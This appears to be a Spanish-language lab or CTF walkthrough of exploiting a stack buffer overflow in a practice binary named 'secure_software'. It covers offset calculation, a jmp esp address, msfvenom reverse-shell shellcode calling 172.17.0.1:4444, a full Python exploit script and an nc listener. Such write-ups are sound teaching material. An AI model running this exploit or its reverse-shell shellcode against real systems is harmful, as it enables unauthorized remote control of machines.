# secure_software

En este apartado explicare la forma de explotar el binario `secure_software`, primero ejecutamos el binario para observar como funciona

![image](https://github.com/user-attachments/assets/90305510-7b4f-4b8c-889f-a515fab4ad73)

por lo visto el binario lo que hace es colocarse en escucha, por lo que podemos conectarnos a el con `netcat` o `telnet`

![image](https://github.com/user-attachments/assets/3a2cb6b8-e9c3-4179-a354-1c8bebaea353)

vemos que nos solicita introducir informacion, realizare pruebas a ver si ocurre un posible desbordamiento de buffer

![image](https://github.com/user-attachments/assets/03e181bf-a1d1-4fab-90c5-6916df39a0fe)

observamos como a respondido el binario `zsh: segmentation fault  ./secure_software` un fallo de segmentacion, podria ser vulnerable a un `BOF` vamos a intentar explotarlo....
Primero vamos a chequear las protecciones del binario

### Protecciones del Binario

```ruby
checksec --file=secure_software
```
![image](https://github.com/user-attachments/assets/dc06e779-bc66-48cb-aa9d-2c8c1f610dee)

tiene las protecciones desactivadas por lo que es de los mas faciles de explotar, al estar `NX` Desactivado podriamos cargar una `shellcode` en memoria, ya conociendo esto, vamos a pasar
al calculo del `offset`

### Calculando el offset

para llevar a cabo este calculo estare usando 2 exploit de `Metasploit` 

```bash
1) /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
2) /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

el primer exploit lo usare para generar una cadena especialmente disena para el calculo del `offset` y el segundo para realizar el calculo

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 # generamos una cadena de 500 byte la cual sera enviada al binario
```
```bash
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

corremos el binario dentro de un depurador (gdb en este caso)

```ruby
gdb ./secure_software -q
run secure_software
```
y enviamos la cadena generada anteriormente

![image](https://github.com/user-attachments/assets/1bbb78a5-e1e0-4453-97e8-a450a34db1fd)

obtenemos con esto el valor de `EIP`, `0x41306b41` que sera lo que le pasemos al segundo exploit de `metasploit`

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41306b41
```

![image](https://github.com/user-attachments/assets/bbc91fa0-4436-4eaf-a40b-b9a850717010)

ya con esto hemos calculado el valor del offset, esto quiere decir, que si enviamos 300 byte al binario, el buffer sera sobreescrito por completo llegando asi al `EIP` que es lo que
queremos controlar, ahora para verificar que esto sea correcto, le enviaremos al binario 300 A y 4 B, con esto el valor del `EIP` deberia ser 0x424242 si el offset es correcto

![image](https://github.com/user-attachments/assets/7d4fc2c0-3156-468e-9413-de4defab9ce7)

aqui observamos como en efecto, tenemos control del `EIP`, ahora tenemos que generar una `shellcode`

### Generando una SHELLCODE

para generar una `shellcode` usare `msfvenom`

```ruby
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -b '\x00\x0a\x0d' -f py

buf =  b""
buf += b"\xbd\x4e\xd5\x3c\xcb\xda\xc6\xd9\x74\x24\xf4\x5f"
buf += b"\x2b\xc9\xb1\x12\x31\x6f\x12\x83\xc7\x04\x03\x21"
buf += b"\xdb\xde\x3e\x8c\x38\xe9\x22\xbd\xfd\x45\xcf\x43"
buf += b"\x8b\x8b\xbf\x25\x46\xcb\x53\xf0\xe8\xf3\x9e\x82"
buf += b"\x40\x75\xd8\xea\xfe\x94\x1a\xeb\x96\x94\x1a\xfa"
buf += b"\x3a\x10\xfb\x4c\xa4\x72\xad\xff\x9a\x70\xc4\x1e"
buf += b"\x11\xf6\x84\x88\xc4\xd8\x5b\x20\x71\x08\xb3\xd2"
buf += b"\xe8\xdf\x28\x40\xb8\x56\x4f\xd4\x35\xa4\x10"
```

```bash
shell = b"" + b"\xbd\x4e\xd5\x3c\xcb\xda\xc6\xd9\x74\x24\xf4\x5f" + b"\x2b\xc9\xb1\x12\x31\x6f\x12\x83\xc7\x04\x03\x21" + b"\xdb\xde\x3e\x8c\x38\xe9\x22\xbd\xfd\x45\xcf\x43" + b"\x8b\x8b\xbf\x25\x46\xcb\x53\xf0\xe8\xf3\x9e\x82" + b"\x40\x75\xd8\xea\xfe\x94\x1a\xeb\x96\x94\x1a\xfa" + b"\x3a\x10\xfb\x4c\xa4\x72\xad\xff\x9a\x70\xc4\x1e" + b"\x11\xf6\x84\x88\xc4\xd8\x5b\x20\x71\x08\xb3\xd2" + b"\xe8\xdf\x28\x40\xb8\x56\x4f\xd4\x35\xa4\x10"
```
ahora necesitamos saber donde se ubicara la `shellcode` despues del `eip`

### Identificando donde se registra en memoria lo que pasemos despues del `eip`

para esto enviamos el siguiente payload al binario 

```ruby
python2 -c 'print("A"*300 + "B"*4 + "C"*500)'

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

![image](https://github.com/user-attachments/assets/03533257-1c0d-4054-b6ae-068784fb6fce)

enviamos una gran cantidad de C para localizarlas mas rapido al inspeccionar la memoria

![image](https://github.com/user-attachments/assets/4f086df2-4aac-4b3d-a1d5-b6efde430689)

aqui observamos que se registran al comienzo de la pila, por lo que necesitamos la direccion de la instruccion `jmp esp` la cual se encarga de redireccionar el flujo del programa al 
comienzo de la pila ya que es donde se registrara lo que pasemos despues del `eip`

### Localizando direccion de memoria de la instruccion `jmp esp`

Para localizar dicha direccion usaremos `objdump`

```ruby
objdump -d secure_software | grep jmp |grep esp
```

![image](https://github.com/user-attachments/assets/fae31db1-8f05-4fe6-a565-08c1abebdc0d)

direccion `jmp esp` = 0x8049213

esta direccion deberemos escribirla en el `eip` para que despues de desbordar el buffer, el programa salte al inicio de la pila donde se encontrara la `shellcode` que cargaremos

### Script

Ya teniendo la informacion que necesitamos, procedemos a crear un script para explotar el BOF

datos:

```bash
offset = 300
eip = b"\x13\x92\x04\x08
NOP's = b"\x90" 
shell = b"" + b"\xbd\x4e\xd5\x3c\xcb\xda\xc6\xd9\x74\x24\xf4\x5f" + b"\x2b\xc9\xb1\x12\x31\x6f\x12\x83\xc7\x04\x03\x21" + b"\xdb\xde\x3e\x8c\x38\xe9\x22\xbd\xfd\x45\xcf\x43" + b"\x8b\x8b\xbf\x25\x46\xcb\x53\xf0\xe8\xf3\x9e\x82" + b"\x40\x75\xd8\xea\xfe\x94\x1a\xeb\x96\x94\x1a\xfa" + b"\x3a\x10\xfb\x4c\xa4\x72\xad\xff\x9a\x70\xc4\x1e" + b"\x11\xf6\x84\x88\xc4\xd8\x5b\x20\x71\x08\xb3\xd2" + b"\xe8\xdf\x28\x40\xb8\x56\x4f\xd4\x35\xa4\x10"

NOTA:La dirección de la instruccion [jmp esp] debe ingresarse al revés. La razón de esto es que las computadoras actuales son little-endian
(el byte menos significativo se almacena en la dirección más pequeña), por lo que cada entrada debe ingresarse al revés.
```

construimos el script

```python
#!/usr/bin/env python3

import socket
ip_addr = "127.0.0.1"
port = 20201
offset = 300
full_buffer = b"A"*offset #Desbordamos el buffer para alcanzar `EIP`
eip = b"\x13\x92\x04\x08" # redireccionamos el flujo del programa al comienzo de la pila
des_eip = b"\x90"*50 # nop's para asegurarnos de que se ejecute la shellcode de forma correcta
shell = b"" + b"\xbd\x4e\xd5\x3c\xcb\xda\xc6\xd9\x74\x24\xf4\x5f" + b"\x2b\xc9\xb1\x12\x31\x6f\x12\x83\xc7\x04\x03\x21" + b"\xdb\xde\x3e\x8c\x38\xe9\x22\xbd\xfd\x45\xcf\x43" + b"\x8b\x8b\xbf\x25\x46\xcb\x53\xf0\xe8\xf3\x9e\x82" + b"\x40\x75\xd8\xea\xfe\x94\x1a\xeb\x96\x94\x1a\xfa" + b"\x3a\x10\xfb\x4c\xa4\x72\xad\xff\x9a\x70\xc4\x1e" + b"\x11\xf6\x84\x88\xc4\xd8\x5b\x20\x71\x08\xb3\xd2" + b"\xe8\xdf\x28\x40\xb8\x56\x4f\xd4\x35\xa4\x10"

#payload = [Desbordamos buffer] + [Redireccionamos al comienzo de la pila] + [NOP's] + [shellcode]

payload = full_buffer + eip + des_eip + shell
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creamos un socket
sock.connect((ip_addr, port)) #  establecemos la conexion con el binario
sock.recv(1024) # recibimos datos {Enter data:}
sock.send(payload) # enviamos el payload
sock.close() # cerramos el socket
```
ya listo el script procedemos a probarlo: corremos el binario desde el depurado (gdb), nos colocamos en escucha con netcat `nc -lnvp 4444` y por ultimo corremos el script

https://github.com/user-attachments/assets/fc1eb1e3-085f-4e35-8183-d9a70ce88f91














